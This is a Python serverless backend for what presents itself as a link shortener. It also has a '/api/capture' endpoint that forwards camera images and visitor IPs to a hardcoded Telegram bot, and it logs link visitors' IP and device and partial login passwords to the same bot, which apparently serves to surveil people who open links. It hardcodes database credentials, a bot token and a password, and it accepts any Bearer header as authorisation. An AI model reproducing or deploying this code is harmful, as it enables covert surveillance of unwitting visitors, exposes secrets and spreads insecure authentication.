import json
import os
import traceback
from datetime import datetime
import random
import string
from pymongo import MongoClient
import requests
import base64
import re

# MongoDB Connection
MONGO_URI = "mongodb+srv://Anish_Gupta:Anish_Gupta@linkshortner.huk3frj.mongodb.net/?appName=LinkShortner"
client = MongoClient(MONGO_URI)
db = client.link_shortener
links_collection = db.links

# Telegram Configuration
TELEGRAM_TOKEN = "8337969851:AAFe-QHJnMScU4ELsIUIlm74-M_WVepuA54"
TELEGRAM_CHAT_ID = "6673230400"
PASSWORD = "@35678"

def send_to_telegram(message):
    """Send message to Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram message error: {e}")
        return False

def send_photo_to_telegram(image_base64, caption=""):
    """Send photo to Telegram"""
    try:
        # Clean the base64 string
        if ',' in image_base64:
            image_base64 = image_base64.split(',')[1]
        
        # Decode base64 to bytes
        image_bytes = base64.b64decode(image_base64)
        
        # Send to Telegram
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
        
        files = {
            'photo': ('photo.jpg', image_bytes, 'image/jpeg')
        }
        
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'caption': caption
        }
        
        response = requests.post(url, files=files, data=data, timeout=15)
        
        # Log if failed
        if response.status_code != 200:
            error_msg = f"📸 Photo send failed: Status {response.status_code}"
            send_to_telegram(error_msg)
        
        return response.status_code == 200
    except Exception as e:
        error_msg = f"📸 Camera Error:\n{str(e)[:200]}"
        send_to_telegram(error_msg)
        return False

def log_event(event_type, details, user_ip="Unknown", user_agent="Unknown"):
    """Log event to Telegram"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        message = f"📊 {event_type}\n"
        message += f"🕐 Time: {timestamp}\n"
        message += f"🌐 IP: {user_ip}\n"
        
        if user_agent:
            message += f"📱 Device: {user_agent[:100]}\n"
        
        message += f"📝 Details: {details}"
        
        send_to_telegram(message)
    except Exception as e:
        print(f"Log event error: {e}")

def handler(event, context):
    """Netlify Function Handler"""
    
    # Extract request info
    path = event['path']
    method = event['httpMethod']
    headers = event.get('headers', {})
    
    # Get client info
    user_ip = headers.get('x-forwarded-for', 'Unknown').split(',')[0]
    user_agent = headers.get('user-agent', 'Unknown')
    
    # CORS headers
    cors_headers = {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
    }
    
    # Handle OPTIONS
    if method == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': cors_headers,
            'body': ''
        }
    
    try:
        # Parse body
        body = {}
        if event.get('body'):
            try:
                body = json.loads(event['body'])
            except:
                body = {}
        
        # === PASSWORD VERIFICATION ===
        if path == '/api/verify' and method == 'POST':
            password = body.get('password', '')
            
            # Log login attempt
            log_event("Login Attempt", f"Password attempt: {password[:10]}...", user_ip, user_agent)
            
            if password == PASSWORD:
                # Generate token
                token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                
                # Log successful login
                log_event("✅ LOGIN SUCCESS", f"User authenticated successfully", user_ip, user_agent)
                
                return {
                    'statusCode': 200,
                    'headers': cors_headers,
                    'body': json.dumps({
                        'success': True,
                        'redirect': '/dashboard.html',
                        'token': token
                    })
                }
            else:
                # Log failed login
                log_event("❌ LOGIN FAILED", f"Wrong password entered", user_ip, user_agent)
                
                return {
                    'statusCode': 401,
                    'headers': cors_headers,
                    'body': json.dumps({
                        'success': False,
                        'message': 'Incorrect password!'
                    })
                }
        
        # === CAMERA CAPTURE ===
        elif path == '/api/capture' and method == 'POST':
            image_data = body.get('image', '')
            
            if image_data:
                # Log capture attempt
                log_event("📸 Camera Capture", f"Image captured successfully", user_ip, user_agent)
                
                # Send to Telegram
                caption = f"📸 Camera Capture\n🕐 {datetime.now().strftime('%H:%M:%S')}\n🌐 IP: {user_ip}"
                photo_sent = send_photo_to_telegram(image_data, caption)
                
                if photo_sent:
                    log_event("✅ Photo Sent", f"Image sent to Telegram", user_ip, user_agent)
            
            return {
                'statusCode': 200,
                'headers': cors_headers,
                'body': json.dumps({'success': True})
            }
        
        # === URL SHORTENING ===
        elif path == '/api/shorten' and method == 'POST':
            # Check auth
            auth_header = headers.get('authorization', '')
            if not auth_header.startswith('Bearer '):
                return {
                    'statusCode': 401,
                    'headers': cors_headers,
                    'body': json.dumps({'success': False, 'message': 'Unauthorized'})
                }
            
            original_url = body.get('url', '')
            if not original_url:
                return {
                    'statusCode': 400,
                    'headers': cors_headers,
                    'body': json.dumps({'success': False, 'message': 'URL required'})
                }
            
            # Generate short code
            short_code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
            
            # Save to MongoDB
            link_data = {
                'short_code': short_code,
                'original_url': original_url,
                'created_at': datetime.now(),
                'click_count': 0
            }
            
            links_collection.insert_one(link_data)
            
            # Get site URL
            host = headers.get('host', 'linkshortnerbyanish.netlify.app')
            short_url = f"https://{host}/l/{short_code}"
            
            return {
                'statusCode': 200,
                'headers': cors_headers,
                'body': json.dumps({
                    'success': True,
                    'short_url': short_url,
                    'short_code': short_code
                })
            }
        
        # === GET LINKS ===
        elif path == '/api/links' and method == 'GET':
            # Check auth
            auth_header = headers.get('authorization', '')
            if not auth_header.startswith('Bearer '):
                return {
                    'statusCode': 401,
                    'headers': cors_headers,
                    'body': json.dumps({'success': False, 'message': 'Unauthorized'})
                }
            
            # Get recent links
            links = list(links_collection.find().sort('created_at', -1).limit(20))
            
            # Convert for JSON
            for link in links:
                link['_id'] = str(link['_id'])
                link['created_at'] = link['created_at'].isoformat()
            
            return {
                'statusCode': 200,
                'headers': cors_headers,
                'body': json.dumps({'success': True, 'links': links})
            }
        
        # === GET LINK FOR REDIRECT ===
        elif path == '/api/get-link' and method == 'GET':
            # Get code from query params
            query = event.get('queryStringParameters', {})
            short_code = query.get('code', '')
            
            if not short_code:
                return {
                    'statusCode': 400,
                    'headers': cors_headers,
                    'body': json.dumps({'success': False, 'message': 'Code required'})
                }
            
            # Find link
            link = links_collection.find_one({'short_code': short_code})
            
            if link:
                # Update click count
                links_collection.update_one(
                    {'short_code': short_code},
                    {'$inc': {'click_count': 1}}
                )
                
                log_event("🔗 Link Accessed", f"Code: {short_code}", user_ip, user_agent)
                
                return {
                    'statusCode': 200,
                    'headers': cors_headers,
                    'body': json.dumps({
                        'success': True,
                        'found': True,
                        'original_url': link['original_url']
                    })
                }
            else:
                return {
                    'statusCode': 404,
                    'headers': cors_headers,
                    'body': json.dumps({'success': False, 'message': 'Link not found'})
                }
        
        # === ERROR LOGGING ===
        elif path == '/api/log-error' and method == 'POST':
            error_data = body.get('error', {})
            
            error_msg = f"🐛 FRONTEND ERROR\n"
            error_msg += f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
            error_msg += f"🌐 IP: {user_ip}\n"
            error_msg += f"📄 Page: {error_data.get('page', 'Unknown')}\n"
            error_msg += f"❌ Error: {error_data.get('message', 'Unknown')}\n"
            error_msg += f"📍 Location: {error_data.get('location', 'Unknown')}"
            
            send_to_telegram(error_msg)
            
            return {
                'statusCode': 200,
                'headers': cors_headers,
                'body': json.dumps({'success': True})
            }
        
        # === CHECK AUTH ===
        elif path == '/api/check-auth' and method == 'GET':
            auth_header = headers.get('authorization', '')
            
            if auth_header.startswith('Bearer '):
                return {
                    'statusCode': 200,
                    'headers': cors_headers,
                    'body': json.dumps({'authenticated': True})
                }
            
            return {
                'statusCode': 200,
                'headers': cors_headers,
                'body': json.dumps({'authenticated': False})
            }
        
        # Not found
        return {
            'statusCode': 404,
            'headers': cors_headers,
            'body': json.dumps({'success': False, 'message': 'Endpoint not found'})
        }
    
    except Exception as e:
        # Send error to Telegram
        error_details = f"🔥 SERVER ERROR\n"
        error_details += f"Path: {path}\n"
        error_details += f"Method: {method}\n"
        error_details += f"Error: {str(e)}\n"
        error_details += f"Traceback: {traceback.format_exc()[:1000]}"
        
        send_to_telegram(error_details)
        
        return {
            'statusCode': 500,
            'headers': cors_headers,
            'body': json.dumps({
                'success': False,
                'message': 'Internal server error',
                'error': str(e)
            })
      }
